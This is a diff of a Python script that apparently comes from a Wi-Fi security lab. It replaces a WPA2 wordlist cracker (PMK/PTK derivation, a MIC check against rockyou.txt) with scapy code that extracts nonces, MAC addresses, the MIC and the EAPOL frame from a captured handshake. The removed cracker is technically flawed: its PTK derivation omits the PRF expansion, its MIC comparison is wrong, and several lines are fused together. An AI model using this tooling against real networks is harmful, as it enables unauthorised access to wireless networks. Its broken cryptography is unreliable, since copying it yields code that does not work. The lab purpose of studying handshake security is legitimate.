@@ -1,58 +1,61 @@
-import hashlib
-import hmac
+from scapy.all import rdpcap, raw
 import binascii
-import os
 
-def pbkdf2_hmac_sha1(password, ssid, iterations, dklen=32):
-   
-    """
-    Key derivation function (PBKDF2) with HMAC-SHA1 as the PRF, 
-    used to generate the Pairwise Master Key (PMK).
-    """
-    return hashlib.pbkdf2_hmac('sha1', password.encode(), ssid.encode(), iterations, dklen)def calculate_ptk(pmk, a_nonce, s_nonce, ap_mac, client_mac):
-   
-    """
-    Calculate the Pairwise Transient Key (PTK) by combining the 
-    PMK with the handshake parameters (nonces, MAC addresses).
-    """
-    b = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(a_nonce, s_nonce) + max(a_nonce, s_nonce)
-    return hmac.new(pmk, b, hashlib.sha1).digest()def verify_password(pmk, ptk, eapol_msg, mic):
-      
-    """
-    Verify if the calculated MIC (Message Integrity Code) matches the actual MIC from the handshake.
-    """
-    calculated_mic = hmac.new(ptk[:16], eapol_msg, hashlib.sha1).hexdigest()
-    return calculated_mic == micdef crack_wifi_password(ssid, wordlist_file, a_nonce, s_nonce, ap_mac, client_mac, eapol_msg, mic):
-   
-    """
-    Attempt to crack the Wi-Fi password by iterating through the wordlist and checking each password.
-    """
-    with open(wordlist_file, 'r') as wordlist:
-        for password in wordlist:
-            password = password.strip()
-            print(f"Trying password: {password}")
-            pmk = pbkdf2_hmac_sha1(password, ssid, 4096)
-            ptk = calculate_ptk(pmk, a_nonce, s_nonce, ap_mac, client_mac)
-          
-            if verify_password(pmk, ptk, eapol_msg, mic):
-                print(f"Password found: {password}")
-                return password
-              
-    print("Password not found.")
-    return None# Replace these with actual values from the captured handshake
+# Cargamos la captura y vamos iterando los paquetes
+scapycap = rdpcap("000 PSK filtrado Facility - facility2018.pcap")
+count = 0  # Inicializamos la variable count para contar los mensajes del handshake
+
+for packet in scapycap:
+    if packet.haslayer("EAPOL"):
+        raw_data = bytes(raw(packet["EAPOL"])).hex()
+        # Si es el 1º mensaje del handshake
+        if count == 0:
+           # Extraemos anonce y lo pasamos a bin
+           anonce = binascii.a2b_hex(raw_data[26:90])
+           # Extraemos mac cli, eliminamos ":" y pasamos a hex
+           macCli = binascii.a2b_hex(packet.addr1.replace(":", "").lower())
+        # Si es el segundo mensaje del handshake
+        elif count == 1:
+           # Extraemos el snonce y lo pasamos a bin
+           snonce = binascii.a2b_hex(raw_data[26:90])
+           macAP = binascii.a2b_hex(packet.addr3.replace(":", "").lower())
+           # Almacenamos el MIC
+           captured_mic = raw_data[154:186] 
+           #captured_mic = raw_data[192:208]  # Ajusta según la posición del MIC
+           # Almacenamos en hexadecimal la capa de autenticación EAPOL
+           Eapol2frame = raw_data
+        count += 1
+
+# Datos de AP convertidos a HEX legible:
+macAP_hex = binascii.hexlify(macAP).decode('utf-8')
+anonce_hex = binascii.hexlify(anonce).decode('utf-8')
+
+# Datos de STA convertidos a HEX legible:
+snonce_hex = binascii.hexlify(snonce).decode('utf-8')
+macSTA_hex = binascii.hexlify(macCli).decode('utf-8')
+
+# MIC a formato HEX legible:
+captured_mic_hex = binascii.hexlify(binascii.a2b_hex(captured_mic)).decode('utf-8') if captured_mic else "No MIC found"
+
+# Capa de autenticación EAPOL en HEX
+Eapol2frame = Eapol2frame
+
+print("Datos extraídos de AP:")
+print()
+print("MAC AP:", macAP_hex)
+print("Anonce:", anonce_hex)
+print()
+print("Datos extraídos de STA:")
+print()
+print("MAC STA:", macSTA_hex)
+print("SNonce (Hex):", snonce_hex)
+print()
+print("captured MIC:", captured_mic_hex)
+print("Eapol2frame RAW Packet (Hex):", Eapol2frame)
+
+if count == 0:
+    print("No handshake found!")
+    exit()
 
 
-ssid = "YourSSID"
-wordlist_file = "rockyou.txt"
-a_nonce = binascii.unhexlify("Nonce from AP")
-s_nonce = binascii.unhexlify("Nonce from client")
-ap_mac = binascii.unhexlify("MAC address of AP")
-client_mac = binascii.unhexlify("MAC address of client")
-eapol_msg = binascii.unhexlify("EAPOL message")
-mic = "MIC from handshake"cracked_password = crack_wifi_password(ssid, wordlist_file, a_nonce, s_nonce, ap_mac, client_mac, eapol_msg, mic)
-
-if cracked_password:
-    print(f"Successfully cracked the password: {cracked_password}")
-else:
-    print("Failed to crack the password.")
   
